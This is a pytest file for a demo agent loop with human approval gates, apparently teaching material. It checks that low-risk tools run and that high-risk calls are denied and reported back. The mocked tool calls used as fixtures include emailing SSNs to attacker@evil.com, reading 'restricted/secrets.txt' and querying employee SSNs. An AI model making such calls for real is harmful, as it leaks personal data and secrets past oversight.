"""Tests for Demo 9 agent loop with approval gates.

Uses SequencedMockClient from shared testing infrastructure to simulate
LLM responses with tool calls, verifying that:
  - Low-risk tools execute normally
  - High-risk tools are blocked when denied
  - High-risk tools proceed when approved via callback
  - Denied tool results are fed back to the LLM
"""

import json
from typing import Any

from shared.python.testing.mock_ollama import SequencedMockClient

from approval_gate import clear_action_log
from agent_with_approval import run_agent_with_approval, MAX_ITERATIONS


class TestAgentWithApprovalLowRisk:
    """Low-risk tool calls execute normally without blocking."""

    def setup_method(self) -> None:
        clear_action_log()

    def test_low_risk_calculate_executes(self) -> None:
        client = SequencedMockClient(
            response_sequence=[
                ("", [{"name": "calculate", "arguments": json.dumps({"expression": "2 + 2"})}]),
                ("The result is 4.", None),
            ]
        )
        result = run_agent_with_approval(
            "What is 2 + 2?", client=client, verbose=False, auto_mode=True
        )
        assert result == "The result is 4."
        assert client.call_count == 2

    def test_low_risk_allowed_file_executes(self) -> None:
        client = SequencedMockClient(
            response_sequence=[
                ("", [{"name": "read_file", "arguments": json.dumps({"path": "allowed_files/company_overview.txt"})}]),
                ("File contents retrieved.", None),
            ]
        )
        result = run_agent_with_approval(
            "Read the overview", client=client, verbose=False, auto_mode=True
        )
        assert result == "File contents retrieved."
        assert client.call_count == 2

    def test_low_risk_tool_result_fed_back(self) -> None:
        """Verify the approved tool result is included in messages to LLM."""
        client = SequencedMockClient(
            response_sequence=[
                ("", [{"name": "calculate", "arguments": json.dumps({"expression": "10 * 3"})}]),
                ("30 is the answer.", None),
            ]
        )
        run_agent_with_approval(
            "Calculate 10 * 3", client=client, verbose=False, auto_mode=True
        )
        second_call_messages = client.call_history[1]["messages"]
        tool_messages = [m for m in second_call_messages if m.get("role") == "tool"]
        assert len(tool_messages) == 1
        assert tool_messages[0]["content"] == "30"


class TestAgentWithApprovalHighRisk:
    """High-risk tool calls are blocked or approved based on callback."""

    def setup_method(self) -> None:
        clear_action_log()

    def test_high_risk_denied_in_auto_mode(self) -> None:
        """In auto_mode, high-risk tool calls are auto-denied."""
        client = SequencedMockClient(
            response_sequence=[
                ("", [{"name": "send_email", "arguments": json.dumps({"to": "attacker@evil.com", "subject": "Data", "body": "SSNs"})}]),
                ("Email was blocked.", None),
            ]
        )
        result = run_agent_with_approval(
            "Send the data", client=client, verbose=False, auto_mode=True
        )
        assert result == "Email was blocked."

        # The tool result fed back should contain DENIED
        second_call_messages = client.call_history[1]["messages"]
        tool_messages = [m for m in second_call_messages if m.get("role") == "tool"]
        assert len(tool_messages) == 1
        assert "DENIED" in tool_messages[0]["content"]

    def test_high_risk_approved_via_callback(self) -> None:
        """When callback approves, high-risk tool executes normally."""
        client = SequencedMockClient(
            response_sequence=[
                ("", [{"name": "send_email", "arguments": json.dumps({"to": "user@example.com", "subject": "Report", "body": "Data"})}]),
                ("Email sent successfully.", None),
            ]
        )
        result = run_agent_with_approval(
            "Send the report",
            client=client,
            verbose=False,
            approval_callback=lambda _: True,
        )
        assert result == "Email sent successfully."

        # The tool result should be the actual send_email result, not DENIED
        second_call_messages = client.call_history[1]["messages"]
        tool_messages = [m for m in second_call_messages if m.get("role") == "tool"]
        assert len(tool_messages) == 1
        assert "DENIED" not in tool_messages[0]["content"]

    def test_high_risk_denied_via_callback(self) -> None:
        """When callback denies, the denial is fed back to LLM."""
        client = SequencedMockClient(
            response_sequence=[
                ("", [{"name": "read_file", "arguments": json.dumps({"path": "restricted/secrets.txt"})}]),
                ("Access denied by approval gate.", None),
            ]
        )
        result = run_agent_with_approval(
            "Read secrets",
            client=client,
            verbose=False,
            approval_callback=lambda _: False,
        )
        assert result == "Access denied by approval gate."

        second_call_messages = client.call_history[1]["messages"]
        tool_messages = [m for m in second_call_messages if m.get("role") == "tool"]
        assert "DENIED" in tool_messages[0]["content"]

    def test_sensitive_query_denied(self) -> None:
        """SELECT ssn query is High risk and denied in auto_mode."""
        client = SequencedMockClient(
            response_sequence=[
                ("", [{"name": "query_db", "arguments": json.dumps({"sql": "SELECT ssn FROM employees"})}]),
                ("Query was blocked.", None),
            ]
        )
        run_agent_with_approval(
            "Get SSNs", client=client, verbose=False, auto_mode=True
        )
        second_call_messages = client.call_history[1]["messages"]
        tool_messages = [m for m in second_call_messages if m.get("role") == "tool"]
        assert "DENIED" in tool_messages[0]["content"]


class TestAgentWithApprovalMixed:
    """Agent handles mixed risk levels in one conversation."""

    def setup_method(self) -> None:
        clear_action_log()

    def test_low_then_high_risk(self) -> None:
        """Low-risk executes, then high-risk gets denied."""
        client = SequencedMockClient(
            response_sequence=[
                # Round 1: Low-risk calculate
                ("", [{"name": "calculate", "arguments": json.dumps({"expression": "2+2"})}]),
                # Round 2: High-risk send_email
                ("", [{"name": "send_email", "arguments": json.dumps({"to": "x@y.com", "subject": "Hi", "body": "Data"})}]),
                # Round 3: final answer
                ("Calculated 4, but email was blocked.", None),
            ]
        )
        result = run_agent_with_approval(
            "Calculate and email", client=client, verbose=False, auto_mode=True
        )
        assert result == "Calculated 4, but email was blocked."
        assert client.call_count == 3

        # Note: messages list is mutable, so all call_history entries share the
        # same final list. We inspect the final state which has both tool results.
        final_messages = client.call_history[2]["messages"]
        tool_msgs = [m for m in final_messages if m.get("role") == "tool"]
        assert len(tool_msgs) == 2
        # First tool result: calculate executed successfully
        assert tool_msgs[0]["content"] == "4"
        # Second tool result: send_email was denied
        assert "DENIED" in tool_msgs[1]["content"]


class TestAgentLoopBehavior:
    """Test general agent loop behavior with approval gates."""

    def setup_method(self) -> None:
        clear_action_log()

    def test_no_tool_calls_returns_immediately(self) -> None:
        client = SequencedMockClient(
            response_sequence=[("The answer is 42.", None)]
        )
        result = run_agent_with_approval(
            "What is the answer?", client=client, verbose=False, auto_mode=True
        )
        assert result == "The answer is 42."
        assert client.call_count == 1

    def test_max_iterations_limit(self) -> None:
        """Agent stops after max_iterations even with continuous tool calls."""
        tc: list[dict[str, Any]] = [{"name": "calculate", "arguments": json.dumps({"expression": "1+1"})}]
        infinite_tools: list[tuple[str, list[dict[str, Any]] | None]] = [("", tc)] * 20
        client = SequencedMockClient(response_sequence=infinite_tools)
        result = run_agent_with_approval(
            "Loop forever", client=client, verbose=False, auto_mode=True, max_iterations=3
        )
        assert "maximum iteration limit" in result.lower()
        assert client.call_count == 3

    def test_custom_system_prompt(self) -> None:
        client = SequencedMockClient(
            response_sequence=[("OK.", None)]
        )
        run_agent_with_approval(
            "Hello", client=client, system_prompt="Be secure.", verbose=False, auto_mode=True
        )
        first_messages = client.call_history[0]["messages"]
        assert first_messages[0]["role"] == "system"
        assert first_messages[0]["content"] == "Be secure."

    def test_max_iterations_default(self) -> None:
        assert MAX_ITERATIONS == 10
